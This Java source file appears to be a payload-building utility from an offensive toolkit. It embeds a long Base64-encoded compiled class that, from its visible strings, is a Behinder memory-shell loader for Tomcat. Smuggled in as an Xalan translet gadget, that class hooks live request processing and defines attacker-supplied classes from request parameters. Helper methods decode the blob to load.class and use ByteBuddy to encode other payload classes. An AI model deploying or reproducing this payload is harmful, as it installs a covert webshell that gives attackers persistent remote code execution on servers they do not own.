package cn.safe6.util;


import cn.safe6.payload.TomcatEchoAll;
import net.bytebuddy.ByteBuddy;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Base64;

public class GetByteCodeUtil {

    public static void main(String[] args) throws Exception {
        decodeData();
       //encodeData();

        //getFileByBytes(TomcatEchoAll.getPayload(),"load.class");
    }

    public static void decodeData() throws Exception {

        String data ="yv66vgAAADQA/QoAAgCMBwCNCgAqAI4HAI8KACoAkAoABACRCgCSAJMKAJIAlAoAPACVCgCWAJcKAJYAmAgAmQoAOwCaBwBzCgCWAJsIAJwKAJ0AnggAnwgAoAcAoQgAoggAiAgAowcApAgApQcApgsAGgCnCwAaAKgIAKkHAKoKAB4AqwcArAoAIACtCgAgAK4IAK8KACAAsAcAsQoAJQCVCgAlALIHALMIALQHALUHAFYJADEAtgoAKgC3CgC4AJMHALkKACoAugcAuwoAMQC8CgC4AL0IAL4KACoAvwcAwAcAwQoAwgDDCgACAMQKABgAxQcAxgcAxwEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjEBABJMamF2YS9sYW5nL1N0cmluZzsBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMBABFMamF2YS9sYW5nL0NsYXNzOwEADVN0YWNrTWFwVGFibGUHAMgHALUHAI8BAApFeGNlcHRpb25zAQAGPGluaXQ+AQADKClWAQAFdmFyMTMBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAV2YXIxNAEAAltCAQAFdmFyMTUBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXZhcjE2AQAFdmFyMTcBAAV2YXIxOAEABXZhcjE5AQAFdmFyMjABAAV2YXIyMQEABXZhcjExAQAHcmVxdWVzdAEAG0xvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0OwEABnZhcjEwMQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEABnZhcjExMQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAAZ2YXIxMjEBACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABXZhcjEwAQABSQEABHZhcjkBABBMamF2YS91dGlsL0xpc3Q7AQAEdmFyNwEAEkxqYXZhL2xhbmcvVGhyZWFkOwEABHZhcjYBAAR0aGlzAQArTGNuL3NhZmU2L3BheWxvYWQvbWVtc2hlbGwvQmVoaW5kZXJMb2FkZXIyOwEABHZhcjQBAAFaAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAxgcAyQcAygcAjQcApAcApgcAqgcArAcAywcAzAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABRCZWhpbmRlckxvYWRlcjIuamF2YQwAzgDPAQAQamF2YS9sYW5nL09iamVjdAwA0ADRAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADSAM8MAFEA0wcAyAwA1ADVDADWANcMAFEAUgcAyQwA2ADZDADaANsBAAd0aHJlYWRzDAA9AD4MANwA3QEABGV4ZWMHAMoMAN4A3wEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAZnbG9iYWwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKcHJvY2Vzc29ycwEADmphdmEvdXRpbC9MaXN0DADgAOEMANYA4gEAA3JlcQEAGW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3QMAOMA4gEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAOQA5QwA5gDnAQACYzEMAOgA6QEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAOoA6wEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzDADsAEsMAO0A7gcA7wEAKGNuL3NhZmU2L3BheWxvYWQvbWVtc2hlbGwvQmVoaW5kZXJMb2FkZXIMAPAA8QEAEWphdmEvbGFuZy9JbnRlZ2VyDABRAPIMAPMA9AEAAmMyDAD1APYBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UHAPcMAPgA+QwA+gD7DAD8AFIBACljbi9zYWZlNi9wYXlsb2FkL21lbXNoZWxsL0JlaGluZGVyTG9hZGVyMgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAEGphdmEvbGFuZy9UaHJlYWQBABBqYXZhL2xhbmcvU3RyaW5nAQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXROb3RlAQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAQoSSlWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25z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";
        System.out.println(data);
        System.out.println("oldLen:"+data.length());
        getFileByBytes(Base64.getDecoder().decode(data),"load.class");

        //对比生成前后，长度差距
        //String newData = Base64.getEncoder().encodeToString(getBytesForFile("load.class"));
        //System.out.println(newData);
        //System.out.println("newLen:"+ newData.length());

    }

    public static void encodeData(){
        byte[] code= new ByteBuddy()
                .redefine(cn.safe6.payload.memshell.BehinderLoader2.class)
                .name("cn.safe6.payload.memshell.BehinderLoader2")
                .make()
                .getBytes();
        System.out.println(Base64.getEncoder().encodeToString(code));
    }

    public static String getEncodeData(Class className){
        byte[] code= new ByteBuddy()
                .redefine(className)
                .name(className.getName())
                .make()
                .getBytes();
        return Base64.getEncoder().encodeToString(code);
    }

    public static byte[] getDataBytes(Class className){
        byte[] code= new ByteBuddy()
                .redefine(className)
                .name(className.getName())
                .make()
                .getBytes();
        return code;
    }


    //将Byte数组转换成文件
    public static void getFileByBytes(byte[] bytes, String fileName) {
        BufferedOutputStream bos = null;
        FileOutputStream fos = null;
        File file = null;
        try {
            file = new File(fileName);
            fos = new FileOutputStream(file);
            bos = new BufferedOutputStream(fos);
            bos.write(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bos != null) {
                try {
                    bos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }


    public static byte[] getBytesForFile(String fileName) {
        BufferedInputStream bos = null;
        FileInputStream fos = null;
        File file = new File(fileName);
        byte[] b = new byte[(int)file.length()];
        try {
            fos = new FileInputStream(file);
            bos = new BufferedInputStream(fos);
            bos.read(b);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bos != null) {
                try {
                    bos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return b;
    }

    public static byte[] getBytes(char[] chars) {
        Charset cs = Charset.forName("UTF-8");
        CharBuffer cb = CharBuffer.allocate(chars.length);
        cb.put(chars);
        cb.flip();
        ByteBuffer bb = cs.encode(cb);
        return bb.array();
    }




}
